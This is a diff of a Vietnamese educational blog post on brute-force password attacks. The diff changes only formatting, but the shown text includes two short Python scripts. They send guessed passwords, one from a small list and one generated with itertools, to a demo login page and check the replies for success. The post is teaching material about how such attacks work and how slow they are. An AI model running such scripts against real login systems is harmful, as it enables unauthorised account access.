@@ -2,7 +2,7 @@
 layout: post
 title: Hiểu thêm về tấn công brute force
 date: 2015-08-23 11:28
-categories: CSATT, attack
+categories: CSATT attack
 ---
 Hôm trước thầy Tuấn Anh đã nhắc đến phương pháp này, tuy nhiên tôi sẽ làm rõ thêm một số vấn đề, đây không phải là một bài giải cặn kẽ cho các bạn, nó mang tính định hướng nhiều hơn.
 
@@ -48,7 +48,8 @@ Password: 123demo => Wrong password!
 ````
 
 Python:
-```python
+
+{% highlight python %}
 import requests
 pwlist = ['demo', '123', '1234', '123456', 'test', 'demo1', 'demo123', '123demo']
 url = 'http://tqk.itps.com.vn/demo.php'
@@ -57,7 +58,8 @@ for password in pwlist:
   req = requests.post(url, data=payload)
   if('talent' in req.text):
     print('Password found:', password)
-```
+{% endhighlight %}
+
 
 ````
 Admin@LEOK-PC
@@ -69,7 +71,8 @@ Trên đây tôi đã demo cho các bạn phương pháp brute bằng từ đi�
 Việc tấn công có hay không sử dụng từ điển đều được hoạt động trên cùng cơ chế, tức là bạn sẽ phải generate ra các password theo pattern ( bao nhiêu kí tự, thường hay hoa, hay giả sử đã biết kí tự gì đó...v.v..) rồi lần lượt thực hiện việc đăng nhập và dựa vào kết quả trả về để xác định mật khẩu đúng.
 
 Xem ví dụ sau, ở đây tôi sử dụng itertools trong python để generate wordlist:
-```python
+
+{% highlight python %}
 import requests
 import itertools
 import time
@@ -87,7 +90,7 @@ for i in res:
         print('\nTaken %s seconds to crack very easy password' %time.time() - start_time)
     else:
         print('Failed.....')
-```
+{% endhighlight %}
 
 Và khi tôi chạy đoạn code này, với một máy tính "bình dân" của tôi, ước tính phải mất đến hơn 3 năm để có thể duyệt hết được số lượng hơn 2 tỉ mật khẩu đơn giản có độ dài 7 kí tự chỉ bao gồm chữ cái thường và chữ số. ( Ở đây tôi không đề cập đến việc perfomance, multithreading, đường truyền, sử dụng GPU và một số vấn đề khác). Một con số đáng kể.
 
